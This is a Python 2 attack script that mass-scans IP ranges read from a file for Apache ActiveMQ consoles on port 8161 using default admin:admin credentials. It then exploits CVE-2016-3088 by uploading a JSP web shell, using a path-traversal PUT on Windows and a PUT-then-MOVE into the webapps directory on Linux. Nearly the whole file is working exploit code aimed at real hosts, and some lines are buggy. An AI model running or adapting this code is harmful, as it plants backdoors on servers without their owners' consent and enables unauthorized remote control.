#encoding:utf-8

import re
import requests
import sys
import os
import threading
import time
from Queue import Queue
import netaddr

from utils.randomuseragent import randomuseragent

from pocsuite.lib.core.data import logger
from pocsuite.lib.core.enums import CUSTOM_LOGGING
from pocsuite.lib.core.exception import PocsuiteThreadException


class Activemq(object):

    def __init__(self):

        self.in_queue = Queue()

        for ip_CIDR in open('china_ip_list.txt', 'r'):
            cidr = int(ip_CIDR.split('/')[1])
            if cidr < 24:
                continue
            ips = netaddr.IPNetwork(ip_CIDR.strip())
            for ip in ips:
                self.in_queue.put('http://' + str(ip).strip() + ':8161')

        self.total_sites = self.in_queue.qsize()
        self.success_queue = Queue()


    def check_cve_2016_3088(self):
        '''
        affected version:
        Apache ActiveMQ 5.0.0 - 5.13.2
        '''

        while self.in_queue.qsize() > 0:
            url = self.in_queue.get()
            headers = {
                    "Authorization": "Basic YWRtaW46YWRtaW4=",
                    "User-Agent": randomuseragent('useragents.txt')
                    }
            try:
                response = requests.get(url, headers=headers, timeout=5)
                if response.status_code == '200':
                    print url, response.status_code, 'successfully...'
                    self.success_queue.put(url)
            except Exception, e:
                pass

            sys.stdout.write('\r' + ' ' * 80 + str(self.in_queue.qsize()) + ' remain ' + \
                                'total: ' + str(self.total_sites))
            sys.stdout.flush()


    def run(self):

        threads = []
        thread_nums = 60

        try:
            for thread_num in xrange(thread_nums):
                thread = threading.Thread(target=self.check_cve_2016_3088, name=str(thread_num))
                thread.setDaemon(True)
                thread.start()
                threads.append(thread)

            alive = True
            while alive:
                alive = False
                for thread in threads:
                    if thread.isAlive():
                        alive = True
                        time.sleep(0.1)

        except KeyboardInterrupt:
            if self.threads_num > 1:
                logger.log(CUSTOM_LOGGING.SYSINFO, "waiting for threads to finish (Ctrl+C was pressed)")

            try:
                while (threading.activeCount() > 1):
                    pass

            except KeyboardInterrupt:
                raise PocsuiteThreadException("user aborted (Ctrl+C was pressed multiple times)")


    def exploit(self):

        self.success_queue.put('http://192.168.1.104:8161')
        self.success_queue.put('http://192.168.1.101:8161')

        while self.success_queue.qsize() > 0:

            raw_url = self.success_queue.get()
            url = raw_url + '/admin/test/systemProperties.jsp'
            request = requests.Session()
            headers = {
                    "Authorization": "Basic YWRtaW46YWRtaW4=",
                    "User-Agent": randomuseragent('useragents.txt')
                    }
            response = request.get(url, headers=headers)

            is_windows = re.search('windows', response.content)
            data = open('shell.jsp', 'r').read()

            if is_windows:
                 exploit_payload = '/fileserver/sex../..\..\\admin/shell.jsp'
                 exp_url = raw_url + exploit_payload
                 try:

                     request.put(exp_url, headers=headers, data=data)
                     shell_url = raw_url + '/admin/shell.jsp'
                     response = request.get(shell_url, headers=headers)
                     # print response.status_code

                     if response.status_code == 200:
                         print shell_url, 'add shell successfully ...'
                     else:
                         print raw_url, 'add shell fail...'
                 except Exception, e:
                     pass

                 continue

            is_linux = re.search('linux', response.content)
            user_directory = re.search(r'<td>(\S+apache-activemq\S+)</td>', response.content)

            if is_linux and user_directory:

                put_url = raw_url + '/fileserver/shell2.jsp'
                try:
                    request.put(put_url, data=data, headers=headers)
                    headers['Destination'] = raw_url + user_directory.groups()[0] + '/webapps/admin/shell2.jsp'
                    response = request.request('MOVE', put_url, headers=headers)
                    shell_url = raw_url + '/admin/shell2.jsp'
                    response = request.get(shell_url, headers=headers)

                    if response.status_code == 200:
                        print shell_url, 'add shell successfully ...'
                    else:
                        print raw_url, 'add shell fail...'
                except Exception, e:
                    print e


def main():

    activemq = Activemq()
    activemq.run()
    activemq.exploit()

    print '=' * 20 + ' successfully ' + 20 * '='
    while activemq.success_queue.qsize() > 0:
        print activemq.get()


if __name__ == '__main__':
    os.system('clear')

    main()
